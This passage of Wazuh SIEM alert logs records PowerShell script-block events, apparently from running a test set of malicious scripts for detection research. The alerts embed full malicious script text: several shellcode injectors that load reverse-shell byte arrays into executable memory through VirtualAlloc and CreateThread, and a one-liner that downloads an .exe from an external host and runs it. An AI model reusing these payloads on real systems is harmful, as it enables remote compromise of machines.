1,0xc4,0x30,0xad,0x8b,0xc4,0x58,0x09,0xe8,0x96,0x7d,0x56,0x25,0x8b,0x2e,0xc3,0xc6,0xfa,0x83,0x44,0xaf,0x00,0xfa,0xa3,0x70,0xfa,0x29,0x32,0x4c,0x2d,0x17,0x40,0xbc,0xed;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 70f4a7b5-5456-487f-9203-75b04cb56253\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1532.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x92,0xe8,0x3a,0x10,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x6e,0x0a,0xcf,0xec,0x66,0x49,0x30,0x0d,0x76,0x2e,0xb8,0xe8,0x47,0x6e,0xde,0x79,0xf7,0x5e,0x94,0x2c,0xfb,0x15,0xf8,0xc4,0x88,0x58,0xd5,0xeb,0x39,0xd6,0x03,0xc5,0xba,0x4b,0x77,0x44,0x38,0x96,0xa4,0xa6,0x01,0x59,0xb9,0xa7,0x46,0x84,0x30,0xf5,0x1f,0xc2,0xe7,0xea,0x14,0x9e,0x3b,0x80,0x66,0x0e,0x3c,0x75,0x3e,0x31,0x6d,0x28,0x35,0x68,0xad,0xca,0x9a,0x00,0xe4,0xd4,0xff,0x2d,0xbe,0x6f,0xcb,0xda,0x41,0xa6,0x02,0x22,0xed,0x87,0xab,0xd1,0xef,0xc0,0x0b,0x0a,0x9a,0x38,0x68,0xb7,0x9d,0xfe,0x13,0x63,0x2b,0xe5,0xb3,0xe0,0x8b,0xc1,0x42,0x24,0x4d,0x81,0x48,0x81,0x19,0xcd,0x4c,0x14,0xcd,0x65,0x68,0x9d,0xf0,0xa9,0xf9,0xe5,0xd6,0x6d,0xa2,0xbe,0x77,0x37,0x0e,0x10,0x87,0x27,0xf1,0xcd,0x2d,0x23,0x1f,0x19,0x5c,0x6e,0x77,0xee,0x6d,0x91,0x87,0x78,0xe5,0xe2,0xb5,0x27,0x5d,0x6d,0xf5,0xa0,0x7b,0x6a,0xfa,0x9a,0x3c,0xe4,0x05,0x25,0x3d,0x2c,0xc1,0x71,0x6d,0x46,0xe0,0xf9,0xe6,0x96,0x0d,0x2c,0x92,0x93,0x99,0xea,0x7f,0x06,0x95,0x9d,0x7d,0x36,0x07,0xcd,0x0b,0xd0,0x17,0xa1,0x5b,0x4d,0xd7,0x11,0x1c,0x3d,0xbf,0x7b,0x93,0x62,0xdf,0x83,0x79,0x0b,0x75,0x6c,0xd4,0x63,0xe1,0x15,0x7d,0xff,0x90,0xda,0xab,0x85,0x92,0x51,0x58,0x79,0x5c,0x92,0x15,0x69,0x08,0x52,0x60,0xd3,0x9e,0x6d,0x5e,0x7e,0x1e,0xf8,0x65,0x29,0x49,0x94,0x67,0x0c,0xbd,0x3b,0x97,0x7b,0xb6,0xf2,0x0d,0xc4,0xa0,0xfa,0xc1,0xc4,0x30,0xad,0x8b,0xc4,0x58,0x09,0xe8,0x96,0x7d,0x56,0x25,0x8b,0x2e,0xc3,0xc6,0xfa,0x83,0x44,0xaf,0x00,0xfa,0xa3,0x70,0xfa,0x29,0x32,0x4c,0x2d,0x17,0x40,0xbc,0xed;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"70f4a7b5-5456-487f-9203-75b04cb56253","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1532.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:39.768+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":6,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304319.2140248","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:00.3140579Z","eventRecordID":"144906","processID":"5612","threadID":"8792","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',\"$env:TEMP\\Pa_001.exe\");Start-Process (\"$env:TEMP\\Pa_001.exe\")\r\n\r\nScriptBlock ID: 710fdd85-4a07-4f10-b34c-234bf28c8cbc\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1579.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',\\\"$env:TEMP\\\\Pa_001.exe\\\");Start-Process (\\\"$env:TEMP\\\\Pa_001.exe\\\")","scriptBlockId":"710fdd85-4a07-4f10-b34c-234bf28c8cbc","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1579.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:41.425+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":59,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304321.2142809","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:01.9796728Z","eventRecordID":"144914","processID":"3936","threadID":"6160","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbf,0x35,0x1c,0x4e,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: c1f964aa-1773-4cc0-9754-ced6c9cb996a\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1588.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbf,0x35,0x1c,0x4e,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"c1f964aa-1773-4cc0-9754-ced6c9cb996a","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1588.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:42.288+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":60,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304322.2153758","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:02.8722088Z","eventRecordID":"144918","processID":"8944","threadID":"8116","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbd,0xae,0x61,0xf3,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 26fde687-b692-4fdc-b7ee-1af8c638effa\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1590.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbd,0xae,0x61,0xf3,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"26fde687-b692-4fdc-b7ee-1af8c638effa","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1590.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:43.739+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":61,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304323.2164707","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:03.6988642Z","eventRecordID":"144922","processID":"9104","threadID":"7976","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$0ab = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0ab -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x54,0x0b,0x20,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8wer=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8wer.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8wer,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 47410cef-2361-4b43-acff-196f770ad65f\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1602.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$0ab = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0ab -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0